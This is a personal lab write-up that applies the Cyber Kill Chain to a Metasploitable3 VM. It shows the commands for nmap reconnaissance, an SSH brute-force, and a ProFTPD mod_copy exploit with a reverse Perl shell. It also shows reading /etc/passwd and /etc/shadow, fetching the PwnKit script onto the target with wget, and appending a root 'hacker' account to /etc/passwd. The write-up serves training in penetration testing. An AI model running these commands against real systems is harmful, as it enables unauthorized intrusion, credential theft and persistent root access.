# Cyber-Kill-Chain

## Objective

The objective of the “Cyber Kill Chain” project is to deepen my understanding of penetration testing through hands-on experience and the application of the Cyber Kill Chain to a real-world scenario. By simulating a red team attack on a Metasploitable server, I aim to enhance my skills in identifying vulnerabilities, executing exploits, and navigating the complexities of trial and error until achieving success. This project underscores the symbiotic relationship between red team and blue team operations, emphasizing that proficiency in one necessitates a comprehensive understanding of the other.

### Skills Learned

- Gained a deeper understanding of nmap: Identified network ranges, open ports and services
- Hands-on experience with identifying potential vulnerabilities and executing exploits
- Learned techniques for escalating privileges on compromised systems
- Furthered my experience in Metasploit executing exploits
- Used John the Ripper for password cracking
- Established reverse shells and executed commands on compromised systems including file manipulation
- Enhanced problem-solving abilities and research skills
- Applied the Cyber Kill Chain to a real world scenario

### Tools Used

- VirtualBox - A Virtualization software that allows users to create and run virtual machines
- Kali Linux - A Debian-based linux distribution designed for forensic, penetration testing and security research
- Nmap - A network scanning tool used to discover hosts and services on a computer network. It provides information about open ports, running services and their versions
- Metasploit Framework - An open-source penetration testing framework that helps find, exploit and validate vulnerabilities.
- John the Ripper - A password cracking tool that supports various password hash types
- Metasploitable3 - A virtual machine built with a large amount of security vulnerabilities
  
## Steps

### Reconnaissance
- To find my IP address
  ```bash
  ip a s
  ```
  ![ip a s](https://github.com/user-attachments/assets/dc35ee6c-cd5b-40b6-9c1b-9a0d2a8bc2f5)
- The IP and subnet range found is 10.0.2.0/24
- Pinged the network to see which hosts were active:
  
  ```bash
  nmap -sn 10.0.2.0/24
  ```
  
  ![nmap -sn](https://github.com/user-attachments/assets/d7dec4e2-fb39-48ed-9f9d-6137bcdcd1fe)

- To gather information on the active hosts on the network:
  
  ```bash
  nmap -sV 10.0.2.6 -p 0-65535
  ```

  ![nmap -sV](https://github.com/user-attachments/assets/f65cd838-709c-40d0-95fe-2a347c6db6d7)

- The nmap -sV scan provided the evidence needed to pinpoint Metasploitable3 to 10.0.2.6
- To gather more information, an aggressive scan was ran:
  
  ```bash
  nmap -A 10.0.2.6
  ```

  ![nmap -A 1](https://github.com/user-attachments/assets/01f9b707-99a4-4426-8523-bedbf800c43b)
  ![nmap -A 2](https://github.com/user-attachments/assets/a6c3ab26-ce48-49c5-8fbc-fa3cce581cb4)

- A user enumeration was ran on port 445:

  ```bash
  nmap --script smb-enum-users -p 445 10.0.2.6
  ```

  ![Chewbacca p445](https://github.com/user-attachments/assets/540ceaa0-4e1c-4572-99da-ec6d5b04d6b4)

- The nmap scanned provided a username: Chewbacca
- While exploring for another vulnerability, an SSH brute-force was attempted on the user

### Weaponization, Delivery, Exploitation
- To attempt an SSH brute-force, the following was ran in Metasploit:
  
  ```bash
  msfconsole 
  use auxiliary/scanner/ssh/ssh_login
  set rhosts 10.0.2.6
  set username chewbacca
  set pass_file /user/share/wordlists/rockyou.txt
  set verbose true
  set threads 16
  set stop_on_success true
  run
  ```

  ![bruteforce](https://github.com/user-attachments/assets/bb4b9796-74c7-4b06-8174-f4e255a3ba34)

- A search was ran in Metasploit on ProFTPD to investigate potential exploits:

  ![proftpd search](https://github.com/user-attachments/assets/23139e70-6b78-4b2e-943a-8679bad7abde)

- Exploit-DB was used to cross-reference the exploits associated with ProFTPD in Metasploit:

  ![exploit-db](https://github.com/user-attachments/assets/1d7ff8cd-2f78-46ae-98e9-008be36401d5)

- To use the modcopy ProFTPD exploit, the following was used in Metasploit:

  ```bash
  set rhosts 10.0.2.6 - to set target host
  set sitepath /var/www/html
  set payload cmd/unix/reverse_perl
  set lhost 10.0.2.5
  run
  ```
  
- After the payload was sent, a successful reverse shell connection was executed:

  ![Protdp exploit](https://github.com/user-attachments/assets/fcd7c6b2-190e-4f3b-ac91-72c49feb8096)

- Once the connection to the target host was successful, the directory was changed to /etc to move into the password and shadow file directory
  ```bash
  cd /etc

- To collect information on the users in the system:
  
  ```bash
  cat /etc/passwd
  ```

  ![passwd](https://github.com/user-attachments/assets/ca56921b-4052-4737-b17d-8f515950fbff)

- After the contents from the passwd file were collected, I attempted to access the contents in the shadow file with:

  ```bash
  cat /etc/shadow
  sudo cat /etc/shadow
  ```
  
- The user account that was accessed did not have permissions to view the /etc/shadow file nor any sudo privileges after attempting 'sudo -l'
- To discover which user is being used:
  ```bash
  whoami
  ```

- To access the shadow file, I needed access to the server with appropriate permissions, the following command was ran:

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
  - find / - starts the search for files and directores from the top of the directory and down
  - -perm - specifies the search to files with specific permissions
  - -4000 - identifies files with the setuid bit set. (If a regular user executes the file, it runs with the privileges of the file's owner, often root. Helps to identify security flaws)
  - 2>/dev/null - redirects the the error messages to not display in the terminal
 
  ![noshadownosudo](https://github.com/user-attachments/assets/d27c2375-dd93-474b-b036-57a8f17f5c5e)

### Installation

- Pkexec allows an authorized user to execute a program as another user, the version number was checked and identified as pkexec version 0.105
- Exploit-DB was checked for exploits associated with pkexec version 0.105 and the following was found:
  - https://www.exploit-db.com/exploits/50011
  - This exploit, identified as CVE-2021-3560, allows a local attacker to gain elevated privileges by creating a new user with administrative rights and settings its password
- To download the exploit directly into the target host:

  ```bash
  wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh -O /tmp/PwnKit.sh
  ```

- To check if the download was successful, the directory was changed to /tmp and listed the files in the directory
  
  ```bash
  cd /tmp
  ls -l
  ```

  ![pkexecdownload](https://github.com/user-attachments/assets/bf574cf4-09a3-4884-9c28-d1c10e7a087b)

- To run the exploit, the permission had to be modified, however, the current user account wasn't able to

  ![unsuccessfulpermission](https://github.com/user-attachments/assets/08887a1b-53f2-4790-8b71-e74f63a476d3)

- After an another unsuccessful attempt to access the /etc/shadow file, I started to research online and came across a potential security flaw with /etc/passwd.
  Since the current user account had write permissions, I generated a hashed password with openssl on my host machine:

  ```bash
  openssl passwd -1 -salt xyz password
  ```

- On the target machine, in the reverse shell, I ran the following command to add a new user to /etc/passwd with root privileges
  ```bash
  
  echo 'hacker:$1$xyz$cEUv8aN9ehjhMXG/kSFnM1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
  ```
 ### Command and Control
 
- To switch to the new user:
  
  ```bash
  su hacker
  ```
  
  ![echo](https://github.com/user-attachments/assets/c6e5abd3-6961-4186-b1c8-ea55f192a02a)

### Actions on Objectives
  
- The newly created account was not only able to access the /etc/shadow file, but had root access to the entire system

  ![root access](https://github.com/user-attachments/assets/52210765-64ed-4c38-a8da-b9fe24a7b357)






